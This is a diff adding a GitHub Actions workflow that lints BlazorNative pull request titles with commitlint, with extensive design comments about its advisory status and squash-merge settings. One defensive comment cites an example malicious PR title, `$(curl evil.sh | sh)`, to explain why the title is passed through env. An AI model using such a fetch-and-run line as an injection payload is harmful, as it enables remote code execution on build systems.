@@ -1,0 +1,87 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# BlazorNative COMMITLINT (Phase 8.6, decision 5) — the PR title is the commit
+# subject, and this is the only thing that reads it before main does.
+#
+# WHAT IT LINTS: the PR TITLE. Not the branch's commits — this repo squash-merges,
+# so those subjects are DISCARDED and never reach main or release-please. Linting
+# text that is thrown away would red PRs for honest WIP commits and prove nothing.
+#
+# ADVISORY BY DESIGN — THIS IS NOT A FOURTH REQUIRED CHECK. The three required
+# gates keep their names and contexts: `build-test`, `android-build`, `ios-build`.
+# 8.2 set this precedent for release.yml and the reasoning is the same here.
+#
+# THE HONEST CONSEQUENCE, stated rather than hidden: A MIS-TITLED PR CAN MERGE,
+# and release-please will silently ignore it — no changelog line, no bump
+# contribution. That failure is A MISSING CHANGELOG ENTRY, NEVER A WRONG VERSION,
+# and that is not a hope — it is measured: at 1.0.0-preview.N, `fix:`, `feat:`
+# and `feat!:` all produce preview.N+1, so the commit TYPE cannot move the
+# version at all (see .github/workflows/release-please.yml). The blast radius of
+# a mis-typed subject is a changelog section. That is what makes advisory safe
+# here, and it would not be safe in a repo where the type computed the version.
+#
+# Promoting this to required is the owner's call and a branch-protection change.
+# It is not taken here.
+#
+# ⚠⚠ THE THING THAT MAKES THIS LINT SOUND IS NOT IN THIS FILE, AND IT IS NOT DONE.
+#
+#    squash_merge_commit_title is `COMMIT_OR_PR_TITLE` on this repository TODAY.
+#    That means a SINGLE-COMMIT PR uses the COMMIT's subject and IGNORES the
+#    title — so this workflow can go green on `feat(runtime): …` while `wip`
+#    lands on main. The lint would be sound-looking and not sound.
+#
+#    The owner (or someone with admin) must run:
+#
+#      gh api -X PATCH repos/MarcelRoozekrans/BlazorNative \
+#        -f squash_merge_commit_title=PR_TITLE \
+#        -f squash_merge_commit_message=COMMIT_MESSAGES
+#
+#    UNTIL THEN THIS GATE IS DECORATIVE FOR SINGLE-COMMIT PRs — which is most of
+#    them. It is named here, in the file it undermines, rather than in a design
+#    doc, because this is where someone debugging "why did `wip` reach main?"
+#    will be standing.
+#
+# NO SECOND COPY OF THE ENUMS. `.commitlintrc.yml` is the ONE authority.
+# `amannn/action-semantic-pull-request` — the obvious action for this job — was
+# rejected for exactly that: its `types:`/`scopes:` inputs would be a second copy
+# of the lists, which is 8.1 normative rule 2's sin and the reason this repo
+# deleted a roster in the first place. So this pipes the title into commitlint
+# itself.
+#
+# See docs/plans/2026-07-17-phase-8.6-design.md, decisions 5 and 6.
+# ─────────────────────────────────────────────────────────────────────────────
+name: commitlint
+
+on:
+  pull_request:
+    # `edited` is load-bearing and easy to leave out: without it, fixing a bad
+    # title would never re-run this check, and the PR would keep the stale red.
+    types: [opened, edited, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  pr-title:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: actions/setup-node@v6
+        with:
+          node-version: 22
+
+      - name: Install commitlint
+        run: npm install --no-save @commitlint/cli@21 @commitlint/config-conventional@21
+
+      # THE TITLE ARRIVES VIA env, NOT VIA A ${{ }} INTERPOLATION INTO THE SHELL.
+      # A PR title is attacker-controlled text from anyone who can open a PR;
+      # interpolating it directly into a `run:` block is script injection —
+      # a title of `$(curl evil.sh | sh)` would execute. env: is the documented
+      # mitigation, and it costs nothing.
+      - name: Lint the PR title (it IS the commit subject)
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          echo "Linting PR title: $PR_TITLE"
+          printf '%s' "$PR_TITLE" | npx commitlint --config .commitlintrc.yml
